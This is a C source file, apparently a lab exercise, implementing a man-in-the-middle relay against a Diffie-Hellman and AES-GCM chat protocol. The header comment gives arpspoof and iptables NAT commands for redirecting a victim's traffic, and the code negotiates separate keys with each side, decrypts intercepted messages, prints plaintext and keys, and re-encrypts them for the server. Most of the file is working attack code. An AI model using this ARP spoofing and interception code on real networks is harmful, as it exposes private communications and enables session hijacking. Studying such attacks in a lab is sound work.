/*
* @Author: Sun
* @Date:   2020-06-29 14:46:55
* @Last Modified by:   Sun
* @Last Modified time: 2020-07-08 20:38:47
*/

// ----------------------------终端相关命令----------------------------------------
// 修改中间人到客户端的源IP为服务器IP
// iptables -t nat -A POSTROUTING -p tcp -s [mid_ip] -d [client_ip] -j SNAT --to-source [server_ip]
// mine: iptables -t nat -A POSTROUTING -p tcp -s 192.168.40.138 -d 192.168.40.139 -j SNAT --to-source 192.168.40.128
//
// 修改客户端到服务器的目的IP为中间人IP
// iptables -t nat -A PREROUTING -p tcp -s [client_ip] -d [server_ip] -j DNAT --to [mid_ip]
// mine: iptables -t nat -A PREROUTING -p tcp -s 192.168.40.139 -d 192.168.40.128 -j DNAT --to 192.168.40.138
//
// 开启本机的IP转发功能
// 不开启的话攻击之后会使目标机断网而不是欺骗
// 开启: echo 1 >/proc/sys/net/ipv4/ip_forward
// 关闭: echo 0 >/proc/sys/net/ipv4/ip_forward
//
// arp欺骗
// 让目标的流量经过主机的网卡再从网关出去
// 网关也会把原本流入目标机的流量经过主机
// 1.欺骗网关
// arpspoof -i [mid_nic_name] -t [client_ip] [gateway_ip]
// mine: arpspoof -i eth0 -t 192.168.40.139 192.168.40.2
// 2.欺骗服务器
// arpspoof -i [mid_nic_name] -t [client_ip] [server_ip]
// mine: arpspoof -i eth0 -t 192.168.40.139 192.168.40.128
// -------------------------------------------------------------------------------

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <netinet/in.h>
#include <tommath.h>
#include <openssl/bio.h>
#include <openssl/evp.h>
#include <pthread.h>
#include <arpa/inet.h>
#include "aes.c"

#define ARGERROR -1    // 参数个数错误
#define SOCKETERROR -2    // 创建TCP套接字错误
#define BINDERROR -3    // socket绑定错误
#define LISTENERROR -4    // 监听错误
#define SERVER_PORT 10000
#define BUFFER_SIZE 1024

typedef struct m_arg
{
    int server_sockfd;    // 与服务器的套接字
    int client_sockfd;    // 与客户端的套接字
    struct sockaddr_in client_addr;    // 保存的客户端的信息
    // struct sockaddr_in server_addr;
    unsigned char client_iv[32];    // 初始向量
    unsigned char client_tag[16];    // 附加验证数据
    unsigned char client_key[32];    // 客户端密钥

    unsigned char server_iv[32];    // 与服务器的初始向量
    unsigned char server_tag[16];
    unsigned char server_key[32];    // 服务器密钥

    char buffer[512];    // 消息
} m_arg;

// 生成长度为num的随机字符串
void generate_rand_str(unsigned char *str, int num)
{
    int i = 0;
    for (i = 0; i < num; i++)
        str[i] = (char) rand() % 256;
}

// 连接服务器
void connect_to_server(int *sockfd, char *mid_ip, char *server_ip)
{
    // 创建TCP套接字
    if ((*sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        perror("Error ");
        exit(-1);
    }
    struct sockaddr_in mid_addr;
    memset(&mid_addr, 0, sizeof(mid_addr));    // 初始化
    mid_addr.sin_addr.s_addr = inet_addr(mid_ip);    // IP地址(命令行的第三个参数)
    mid_addr.sin_family = AF_INET;
    mid_addr.sin_port = 0;    // 任意端口
    if (bind(*sockfd, (struct sockaddr *) &mid_addr, sizeof(mid_addr)) < 0)
    {
        perror("Error ");
        close(*sockfd);
        exit(-1);
    }

    struct sockaddr_in serv_addr;
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = inet_addr(server_ip);
    serv_addr.sin_port = htons(SERVER_PORT);
    // 连接到真正的服务器
    if (connect(*sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0)
    {
        perror("Error ");
        close(*sockfd);
        exit(-1);
    }
    printf("中间人 %s:%d 连接到服务器 %s:%d\n", inet_ntoa(mid_addr.sin_addr), mid_addr.sin_port, inet_ntoa(serv_addr.sin_addr),
           serv_addr.sin_port);
}

// 与客户端协商客户端对中间人的密钥m_to_c_key
void generate_m_to_c_key(int sockfd, unsigned char *m_to_c_key)
{
    // 接收客户端发来的p、g、y
    char buffer[BUFFER_SIZE] = {0};
    // 接收p
    recv(sockfd, buffer, BUFFER_SIZE, 0);
    // printf("%s\n", buffer);
    mp_int p;
    mp_init(&p);
    mp_read_radix(&p, buffer, 10);
    // 接收g
    recv(sockfd, buffer, BUFFER_SIZE, 0);
    // printf("%s\n", buffer);
    mp_int g;
    mp_init(&g);
    mp_read_radix(&g, buffer, 10);
    // 接收y
    recv(sockfd, buffer, BUFFER_SIZE, 0);
    mp_int y;
    mp_init(&y);
    mp_read_radix(&y, buffer, 10);

    // 生成服务器的私钥a
    mp_int a;
    mp_init(&a);
    mp_rand(&a, p.used);
    // 计算服务器的公钥x
    mp_int x;
    mp_init(&x);
    mp_exptmod(&g, &a, &p, &x);    // x=g^a mod p
    // 发送x给客户端
    mp_toradix(&x, buffer, 10);
    send(sockfd, buffer, strlen(buffer) + 1, 0);    // 发送x
    // 计算key=y^a mod p
    mp_int key;
    mp_init(&key);
    mp_exptmod(&y, &a, &p, &key);
    mp_toradix(&key, buffer, 16);
    // printf("\nkey: %s\n", buffer);
    // 填充aes_key
    int i = 0;
    for (i = 0; i < 64; ++i)
    {
        if (buffer[i] >= 'A' && buffer[i] <= 'F')
            buffer[i] = buffer[i] - 55;    // 10-16
        if (buffer[i] >= '1' && buffer[i] <= '9')
            buffer[i] = buffer[i] - 48;    // 0-9
    }
    for (i = 0; i < 32; ++i)    // 十六进制 0xXX
        m_to_c_key[i] = buffer[2 * i] * 16 + buffer[2 * i + 1];
}

// 找原根
void find_primitive_root(mp_int *p, mp_int *primitive_root)
{
    // 原根检测
    // 对于数p,求出p-1所有不同的质因子p1,p2…pm
    // 对于任何2<=a<=x-1,判定a是否为p的原根,只需要检验a^((x-1)/p1),a^((x-1)/p2) …a^((x-1)/pm)这m个数
    // 是否存在一个数mod x为1
    // 若存在,a不是x的原根,a否则就是x的原根
    // LTM_PRIME_SAFE保证(p-1)/2也是素数,即p-1只有两个质因子2和(p-1)/2

    // p1=2
    mp_int p1;
    mp_init(&p1);
    mp_init_set(&p1, 2);

    // p2=(p-1)/2
    mp_int p2;
    mp_init(&p2);
    mp_sub_d(p, 1, &p2);
    mp_div_2(&p2, &p2);

    mp_int temp;
    mp_init(&temp);
    // 寻找原根
    // a^((p-1)/2) mod p ?= 1
    // a^2 mod p ?= 1
    while (1)
    {
        mp_exptmod(primitive_root, &p1, p, &temp);    // temp = p_r^2 mod p
        if (mp_cmp_d(&temp, 1) != MP_EQ)
        {
            // 如果上面的结果不是1
            // 再计算 temp = p_r^((p-1)/2) mod p
            mp_exptmod(primitive_root, &p2, p, &temp);
            if (mp_cmp_d(&temp, 1) != MP_EQ)
            {
                // 如果这个结果也不是1则找到原根了
                break;
            }
        }
        mp_add_d(primitive_root, 1, primitive_root);    // +1继续
    }
    mp_clear_multi(&p1, &p2, &temp, NULL);    // 释放
}

// 生成素数p、找到本原根
void generate_p(int sockfd, mp_int *p, mp_int *primitive_root)
{
    srand(time(NULL));
    mp_prime_rand(p, 10, 256, LTM_PRIME_SAFE);    // 生成256位的大素数p,回测10次,LTM_PRIME_SAFE保证(p-1)/2也是素数
    char buffer[BUFFER_SIZE];
    mp_toradix(p, buffer, 10);    // 计算p以r为基的表示法并把数位存在数组str中并以字符串形式输出到屏幕上
    // printf("\n素数: %s\n", buffer);
    send(sockfd, buffer, strlen(buffer) + 1, 0);    // p发过去
    //
    find_primitive_root(p, primitive_root);
    mp_toradix(primitive_root, buffer, 10);
    // printf("\n原根: %s\n", buffer);
    send(sockfd, buffer, strlen(buffer) + 1, 0);    // 原根g发过去
}

// 与服务器协商中间人对服务器的密钥m_to_s_key
generate_m_to_s_key(int sockfd, unsigned char *m_to_s_key)
{
    /*-------------------------------------*/
    // 生成p、g、b、y并发送p、g、y
    mp_int p;    // p
    mp_init(&p);    // 初始化mp_int结构使之可以安全的被库中其他函数使用
    mp_int primitive_root;    // 原根
    mp_init(&primitive_root);
    mp_set(&primitive_root, 2);
    generate_p(sockfd, &p, &primitive_root);    // 生成素数p、找到原根g

    mp_int b;    // 客户端的私钥b
    mp_init(&b);
    mp_rand(&b, p.used);
    mp_int y;    // 客户端的公钥y
    mp_init(&y);
    mp_exptmod(&primitive_root, &b, &p, &y);    // y=g^b mod p

    char buffer[BUFFER_SIZE];
    mp_toradix(&y, buffer, 10);
    send(sockfd, buffer, strlen(buffer) + 1, 0);    // 发送y

    /*-----------------------------------*/
    // 接收服务器的x,key=x^b mod p
    recv(sockfd, buffer, BUFFER_SIZE, 0);
    mp_int x;
    mp_init(&x);
    mp_read_radix(&x, buffer, 10);
    mp_int key;
    mp_init(&key);
    mp_exptmod(&x, &b, &p, &key);
    mp_toradix(&key, buffer, 16);
    // printf("\nkey: \n%s\n", buffer);
    // 填充aes_key
    int i = 0;
    for (i = 0; i < 64; ++i)
    {
        if (buffer[i] >= 'A' && buffer[i] <= 'F')
            buffer[i] = buffer[i] - 55;    // 10-16
        if (buffer[i] >= '1' && buffer[i] <= '9')
            buffer[i] = buffer[i] - 48;    // 0-9
    }
    for (i = 0; i < 32; ++i)    // 十六进制 0xXX
        m_to_s_key[i] = buffer[2 * i] * 16 + buffer[2 * i + 1];
}

// 接收消息
int recv_message(m_arg *arg)
{
    int sock = arg->client_sockfd;
    struct sockaddr_in client_addr = arg->client_addr;
    char recv_buffer[512] = {0};
    int recv_n = 0;
    // 接收数据
    while (1)
    {
        recv_n = recv(sock, recv_buffer, 512, 0);
        if (recv_n < 0)    // 接收出错
        {
            printf("客户端 %s:%d 接收消息错误\n", inet_ntoa(client_addr.sin_addr), client_addr.sin_port);
            perror("error: ");
            close(arg->client_sockfd);
            return -1;
        }
        else if (recv_n == 0)    //连接关闭
        {
            printf("客户端 %s:%d 连接关闭\n", inet_ntoa(client_addr.sin_addr), client_addr.sin_port);
            close(arg->client_sockfd);
            return 0;
        }

        // printf("recv_n: %d\n", recv_n);
        recv_buffer[recv_n] = '\0';
        unsigned int iv_len = 32;
        unsigned int tag_len = 16;
        // unsigned int ct_len=recv_n-iv_len;
        unsigned int ct_len = recv_n - iv_len - tag_len;
        unsigned char plain_text[256] = {0};
        // unsigned char cipher_text[256+tag_len]={0};
        unsigned char cipher_text[256] = {0};
        unsigned char tag[16] = {0};
        unsigned char iv[32] = {0};

        memcpy(iv, recv_buffer, iv_len);
        memcpy(cipher_text, recv_buffer + iv_len, ct_len);
        memcpy(tag, recv_buffer + recv_n - tag_len, tag_len);
        cipher_text[ct_len] = '\0';
        printf("\n来自客户端 %s:%d的消息:\n", inet_ntoa(client_addr.sin_addr), client_addr.sin_port);
        BIO_dump_fp(stdout, recv_buffer, recv_n);
        printf("\niv:\n");
        BIO_dump_fp(stdout, iv, iv_len);
        printf("\ntag:\n");
        BIO_dump_fp(stdout, tag, tag_len);
        printf("\ncipher_text:\n");
        BIO_dump_fp(stdout, cipher_text, ct_len);
        printf("\nkey:\n");
        BIO_dump_fp(stdout, arg->client_key, 32);
        decrypt(arg->client_key, plain_text, ct_len, cipher_text, iv, iv_len, tag, tag_len);
        printf("\nplain_text:\n");
        BIO_dump_fp(stdout, plain_text, ct_len);
        printf("\n----------------------------------------------\n");
        // 拷贝一下待会儿发给服务器
        strncpy(arg->buffer, plain_text, ct_len);
        arg->buffer[ct_len] = '\0';
        return 1;
    }
}

// 发送消息
int send_message(m_arg *arg)
{
    unsigned char plain_text[256] = {0};
    unsigned char cipher_text[256 + 16] = {0};
    unsigned char send_buffer[512] = {0};
    unsigned char tag[16] = {0};
    printf("\n");
    strcpy(plain_text, arg->buffer);
    // fgets(plain_text, 255, stdin);
    if (strcmp(plain_text, "quit") == 0)
    {
        return 1;
    }
    unsigned int pt_len = strlen(plain_text);
    unsigned int iv_len = 32;
    unsigned int tag_len = 16;
    encrypt(arg->server_key, plain_text, pt_len, cipher_text, arg->server_iv, iv_len, tag, tag_len);
    memcpy(cipher_text + pt_len, tag, tag_len);

    printf("\nplain_text: \n");
    BIO_dump_fp(stdout, plain_text, pt_len);
    printf("\ntag: \n");
    BIO_dump_fp(stdout, tag, tag_len);
    printf("\ncipher_text: \n");
    BIO_dump_fp(stdout, cipher_text, pt_len + tag_len);

    // [iv][ct|tag]
    memcpy(send_buffer, arg->server_iv, iv_len);
    memcpy(send_buffer + iv_len, cipher_text, pt_len + tag_len);
    send_buffer[iv_len + pt_len + tag_len] = '\0';
    printf("\nsendbuffer:\n");
    BIO_dump_fp(stdout, send_buffer, iv_len + pt_len + tag_len);

    if (send(arg->server_sockfd, send_buffer, strlen(send_buffer), 0) == -1)
    {
        perror("Error ");
        return -1;
    }
    return 0;
}

// 线程函数
void *ex_message(m_arg *arg)
{
    printf("新线程建立...\n");
    while (1)
    {
        if (recv_message(arg) != 1)
            break;
        send_message(arg);
    }
    return NULL;
}

int main(int argc, char *argv[])
{
    if (argc != 3)
    {
        printf("请输入正确的命令行参数 命令格式： ./mid [MID_IP_ADDRESS] [SERVER_IP_ADDRESS]\n");
        return ARGERROR;
    }

    int mid_sockfd = socket(AF_INET, SOCK_STREAM, 0);    //创建TCP套接字(相对于client为服务器)
    if (mid_sockfd < 0)
    {
        perror("创建TCP套接字失败 ");
        return SOCKETERROR;
    }
    struct sockaddr_in mid_addr;    // 服务器地址结构体
    memset(&mid_addr, 0, sizeof(mid_addr));    // 初始化
    mid_addr.sin_family = AF_INET;
    mid_addr.sin_port = htons(SERVER_PORT);    // 网络字节序
    mid_addr.sin_addr.s_addr = inet_addr(argv[1]);
    // 绑定IP和端口
    if (bind(mid_sockfd, (struct sockaddr *) &mid_addr, sizeof(mid_addr)) < 0)
    {
        perror("socket绑定失败 ");
        close(mid_sockfd);
        return BINDERROR;
    }
    printf("中间人绑定至%s\n", inet_ntoa(mid_addr.sin_addr));
    // 监听
    if (listen(mid_sockfd, 10))
    {
        perror("监听失败 ");
        close(mid_sockfd);
        return LISTENERROR;
    }
    printf("中间人启动，等待客户端连接...\n");

    while (1)
    {
        unsigned char m_to_c_iv[32];
        unsigned char m_to_c_tag[16];
        unsigned char m_to_c_key[32];    // 中间人与客户端的密钥

        unsigned char m_to_s_iv[32];
        unsigned char m_to_s_tag[16];
        unsigned char m_to_s_key[32];    // 中间人与服务器的密钥
        unsigned char buf[512];

        int mid_as_s_sockfd = 0;    // 中间人与客户端的套接字
        struct sockaddr_in client_addr;    // 保存客户端addr
        socklen_t client_addr_len = sizeof(client_addr);
        if ((mid_as_s_sockfd = accept(mid_sockfd, (struct sockaddr *) &client_addr, &client_addr_len)) < 0)
        {
            perror("Error ");
            exit(-1);
        }
        printf("客户端 %s:%d 连接到中间人 %s:%d 成功\n", inet_ntoa(client_addr.sin_addr), client_addr.sin_port,
               inet_ntoa(mid_addr.sin_addr), mid_addr.sin_port);
        // 与客户端协商客户端对中间人的密钥m_to_c_key
        generate_m_to_c_key(mid_as_s_sockfd, m_to_c_key);
        // 接收客户端发送的iv
        recv(mid_as_s_sockfd, m_to_c_iv, sizeof(m_to_c_iv), 0);
        // 接收客户端发送的tag
        recv(mid_as_s_sockfd, m_to_c_tag, sizeof(m_to_c_tag), 0);
        printf("\n中间人与客户端的密钥:\n");
        BIO_dump_fp(stdout, m_to_c_key, 32);    // 输出32字节的密钥
        printf("\n中间人与客户端的初始向量:\n");
        BIO_dump_fp(stdout, m_to_c_iv, 32);

        /*-------------------------------------------------*/
        // 向真正的服务器发起连接
        int mid_as_c_sockfd = 0;
        connect_to_server(&mid_as_c_sockfd, argv[1], argv[2]);
        // 生成iv(32字节)
        generate_rand_str(m_to_s_iv, 32);
        memset(m_to_s_tag, '\0', sizeof(m_to_s_tag));
        // 与服务器协商中间人对服务器的密钥m_to_s_key
        generate_m_to_s_key(mid_as_c_sockfd, m_to_s_key);

        printf("\n中间人与服务器的密钥:\n");
        BIO_dump_fp(stdout, m_to_s_key, 32);    // 输出32字节的密钥
        printf("\n中间人与服务器的初始向量:\n");
        BIO_dump_fp(stdout, m_to_s_iv, 32);
        // 发送iv和tag
        send(mid_as_c_sockfd, m_to_s_iv, 32, 0);
        send(mid_as_c_sockfd, m_to_s_tag, 16, 0);
        /*-------------------------------------------------*/

        struct m_arg for_thread;    // 子线程中用的变量
        for_thread.server_sockfd = mid_as_c_sockfd;
        for_thread.client_sockfd = mid_as_s_sockfd;
        for_thread.client_addr = client_addr;
        memcpy(for_thread.client_iv, m_to_c_iv, sizeof(m_to_c_iv));
        memcpy(for_thread.client_tag, m_to_c_tag, sizeof(m_to_c_tag));
        memcpy(for_thread.client_key, m_to_c_key, sizeof(m_to_c_key));
        memcpy(for_thread.server_iv, m_to_s_iv, sizeof(m_to_s_iv));
        memcpy(for_thread.server_tag, m_to_s_tag, sizeof(m_to_s_tag));
        memcpy(for_thread.server_key, m_to_s_key, sizeof(m_to_s_key));

        pthread_t thread_new;
        pthread_create(&thread_new, NULL, (void *) ex_message, (void *) &for_thread);    // 创建线程
        pthread_detach(thread_new);    // 收回线程资源
    }
    close(mid_sockfd);
    return 0;
}
